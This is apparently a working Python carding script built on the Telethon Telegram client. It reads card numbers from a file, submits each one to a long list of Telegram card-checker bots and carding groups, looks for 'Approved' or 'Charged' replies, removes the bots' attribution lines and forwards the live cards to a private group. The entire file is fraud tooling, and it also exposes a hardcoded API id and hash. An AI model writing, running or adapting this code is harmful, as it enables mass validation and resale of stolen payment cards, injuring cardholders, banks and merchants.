import asyncio
from telethon.sync import TelegramClient, events
import re

api_id = 29335915
api_hash = '9961ef035921a2087b0ff8070fda6e12'
done = 0
total_cc_count = sum(1 for line in open('cc.txt'))
txt = ''

client = TelegramClient('session_name', api_id, api_hash)
client.start()

group_username =  -1002056137230 # Replace with the actual group username

approved_keywords = [
    '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅', '[ APPROVED ✅ ]', 'APPROVED ✅', 'Approved! 🟩', 'Auth omplete ✅', 'Approved! ✅', 'APPROVED CCN ✅!', 'APPROVED CVV ✅!', 'Approved ✅', 'APPROVED ✓',
    'Approved #AUTH ✅', 'Payment Successful! ✅', 'CCN LIVE ✅', 'Status succeded (3.1$) ✅','Approved ! ✅',
    'Status succeded (7.21$) ✅', '1000: Approved', 'Status succeded (0.01$) ✅', 'VIVA ✅','𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ✅',
    '🝂 [ APPROVED 🟩 ]', '[Approved ✅]', 'Live 🟡', 'Approved! ✅', '🝂 Approved!🟩', ' Approved!✅',
    'Payment Declined due to Low funds ✅', 'CCN Matched ✅', 'Approved (1000)','𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱!','𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 (𝟭𝟬𝟬𝟬)',
    'Approved!✅', 'CCN/CVV CHARGED ✅', 'Approved!', 'Approved cvv ✅', 'Approved #CCN ✅', '1000: Approved', 'LIVE 🟢','Status succeded (0.20$) ✅',
    ' Your card Approved', 'CHARGED 🟢', 'Payment Complete ✅', 'CHARGED : 1$ ✅','𝐌𝐎𝐍𝐄𝐑𝐈𝐒 - 𝐂𝐂𝐍 ✅','𝐒𝐇𝐎𝐏𝐈𝐅𝐘 - 𝐂𝐂𝐍 ✅',
    'CHARGED = 25.00$','𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅','𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 𝑪𝑪𝑵 ✅','Approved Ccn ✅','Insufficient Funds✅','Card Issuer Declined CVV✅','Thank you for your purchase!','🟢 Charge Full [$1.00]','Approved ✅','APPROVED ⚡','Succeeded ✅','Charged 30$ Braintree','Approved! ✅','Approved ✅','Payment Successfull! ✅ ','VIVA ✅ ','APPROVED ✓','$1 Charged ✅','🟢 CVV Matched','- 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅','Approved!🟩','STRIPE_CH_1$ - LIVE ✅','𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅','Approved! 🟩','Aprobada! ✅','Approved ✅','Charge $10✅,','Aprobada ✅','(MAMITACHULA) ✅']

# Updated bot usernames
bot_usernames = [
    'SDBB_BOT', 'teamcarders_bot', 'Oficial_Estefany_bot', 'kurumichkbot', 'SakuraRendibot', 'CardSavvyX2bot', 'RecallChkBot', 'ArthurChkBot',
    'SiTa_xDBot', 'alterchkbot','anubisccbot', 'DEMON_CHECKER_BOT', 'kiyoponchk_bot',
    'HexadaBot', 'RitaaChk_Bot','RimuruCHKBot','RemZeroChkBot','ReiAyanamiRoBot','Makima_Chk_Bot','RickPrimeChkBot','XDQD_BOT','onyxchecker_bot','Say_4_bot','TechzillaChkBot', 'AstaChkBot','SAVAGECHECKBOT','LEE0Bot', 'itz_Sukuna_bot','trexchk_bot',
    'TDP_SAKKY_CHECKERbot','BR0KEN_CC', 'astronautuniverse', 'BuddyChecker69', 'xUnk2', 'Team_INFIN1TY','TruSRC_bot','Bullet_D13B_Bot','Kisara_ChkBot',
    'ZeroTwoChkBot','WoozY_CCs','JulietteCheckerBot','NagisaChkBot','yatochkbot_bot','AccountChecker_RoBot','shadow_chk_bot','YutaChkBot','yutachk','Ishtarchkbot','JetixBin','NekronChkBot','ArthurChkGroup','NagisaChkFree','NagisaChkFree2','NagisaChkBot','Black7_Chat2','ChargedCreditcards','AlisaChks','ii_DropCCs','LiveCC1','FreeCcOp','GROUP_JOK','Rudeos_Greyrat_bot','StripeChkGroup','Citriiss','botsakuraa','SakuraRendibot','ONLY_MEX1','GenerarBins','cc_checkerr','ravenccchecker','Raven01010','professorccchats','professordonho','HappinessCenX_bot','AstaChkBot','raven_ccs','RemZeroChkBot','RemChatChk','uhqb1ns','cereberus_hub','scrap_amir','ccspitudos','modcathelost','visa_spam3','cc_cvv_1','q_j_8','astroV01','BinnersHub','superchatbin1','SabTeamCCCheckerBot_Updates','DeltaCheckBot','delta_free_users','BinnersHub','CCACTIVE2','ccxtest','ScrapperLala','alterchkchat','ritagroupOfc','TechzillaChkChat','CRKSOO_CC','ccxtest','Drop_cc_Approved','BuddyXChatOfficial','spam_a','Sun_Check_03_bot','ccchkvip','NarcosBAN','Charged_CC_Drop','HackerWorldXd','WoozY_Checks','CHARGEGEVEAWAY','sharenewcc','Online_Escrow_Group','CardSavvyX2bot','Live_ChargedCCs','astronautchatzone','spacegearxbot','grandpaachat','grandpaa_checker_bot','raven_group','Venexchk','BuddyXChatOfficial','BuddyRobot','CCS4KSCRIPT','botbypasswarrior','JohnnySinsChat','JohnnyVerifierBot','Puskaschkbot','cc_x_dark','CHK_JOK','superchatbin','VCLUBCVV','dailybins_1','Alpha_ChkBot'
]

# Set to keep track of forwarded messages
forwarded_messages = set()

async def send_message_to_bot(cc):
    for bot_username in bot_usernames:
        await client.send_message(bot_username, f'.au {cc}')

async def forward_to_group(message):

    # Define the patterns to be removed from the message
    patterns_to_remove = [
        r'''⚜️ 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚:.*?\n''',  # Remove the line starting with "𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚:"
        r'''⚜️ 𝑶𝒘𝒏𝒆𝒓:.*?\n''', # Remove the line starting with "⚜️ 𝑶𝒘𝒏𝒆𝒓: ¥JΞŦΞЯSФЛ¥"
        r'''Author:.*\n''', # Remove the line starting with "Author:."
        r'''• ʙʏ ➪.*\n''',
        r'''• ɢʀᴏᴜᴘ ➪.*\n''',
        r'''Checked by:.*\n''', # Remove the line starting with "Checked by:."
        r'''Bot by.*\n''',
        r'''Checked by - ↯.*\n''',
        r'''checked by.*?\n''',  # Remove the line starting with "checked by"
        r'''- Owner.*?\n''',
        r'''REQ BY.*?\n''',  # Remove the line starting with "REQ BY:"
        r'''Author :.*?\n''' # Remove the line starting with "Author : [Pablo 🧜‍♂️]" 
            r'''Checked By:.*?\n''',  # Remove the line starting with "Checked by:"
        r'''From :.*?\n''', # Remove the line starting with "Checked by:"
        r'''Author :.*?\n''', # Remove the line starting with "From :"
        r'''★.*?\n''' # Remove the line starting with "★"
        r'''Nagisa Chk 么.*?\n'''
        # Remove the line starting with "Nagisa Chk 么"
        r'''ϟ Checked by ￫.*?\n''',
        r'''ᥫ᭡ Checked by ⌁.*?\n''',
        r'''Join by ⌁.*?\n''',
        r'''Send SS Here.*?\n''',
        r'''┊⋮⋮ Global Room.*\n''',
        r'''Code by:.*\n'''
        r''' ∺ ] User ➳.*?\n''',
        r'''Checked by ➜.*?\n''',
        r'''Creador ➜.*?\n''',
        r'''点 CHECKED BY.*?\n''',
        r'''点 BOT BY.*?\n''',
        r'''Dev by.*?\n''',
        r'''Bot By ↳.*?\n''',
        r'''Checked By ↳.*?\n''',
        r'''Checked By ↯.*?\n''',
        r'''Checked by.*?\n''',
        r'''✮ᴄʜᴇᴄᴋᴇᴅ ʙʏ:.*?\n''',
        r'''Requested By ➸.*\n''',
        r'''Bot By ➸.*\n''',
        r'''Author:.*\n''',
        r'''Checked by - ↯.*\n''',
        r'''ϟ Checked by.*?\n''',
        r'''• └ Bot by » .*?\n''',
        r'''• ├ Usuario ».*?\n''',
        r'''‍[火] Johnny[CHK].*?\n''',
        r'''↯Diseñado.*?\n''',
        r'''『⁣↯』 Estado».*?\n''',
      
        r'''𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 ↯.*?\n'''
        r'''⌬ 𝗚𝗲𝘁 𝗠𝗼𝗿𝗲 𝗛𝗲𝗿𝗲.*?\n''',
        r'''Checked By:.*?\n''',
        r'''[✱ (http://t.me/iAmS3B4s)] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:.*?\n''',

    ]

    # Remove the defined patterns from the message
    for pattern in patterns_to_remove:
        message = re.sub(pattern, '', message, flags=re.MULTILINE)

    # Remove usernames and URLs from the entire message
    message = re.sub(r'@(\S+)', '', message)
    message = re.sub(r'\(http\S+\)', '', message)
    message = re.sub(r'\(https\S+\)', '', message)
    message = re.sub(r'\(tg\S+\)', '', message)
    message = re.sub(r'Tfp0days\S+', '', message)
    message = re.sub(r'𝒁𝒆𝒓𝒐𝑻𝒘𝒐𝑪𝒉𝒌\S+', '          ', message)
    message = re.sub(r'Nagisa Chk 么\S+', '', message)

    # Check if the message has already been forwarded
    if message not in forwarded_messages:
        forwarded_messages.add(message)
        await client.send_message(group_username, message)

@client.on(events.NewMessage(from_users=bot_usernames))
@client.on(events.MessageEdited(from_users=bot_usernames))
async def handle_message(event):
    global done
    global txt
    txt = event.message.text
    if 'wait' in event.message.text or 'Waiting' in event.message.text:
        return

    done += 1
    message = event.message.text.replace("`", "")

    # Check if any approved keyword is in the message (case-insensitive)
    if any(keyword.lower() in message.lower() for keyword in approved_keywords):
        print(message)
        # Forward the message to the group
        await forward_to_group(message)

    if done == total_cc_count:
        client.disconnect()

async def main():
    with open('cc.txt', 'r') as file:
        for line in file:
            cc = line.strip()
            await send_message_to_bot(cc)
            await asyncio.sleep(20)

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()
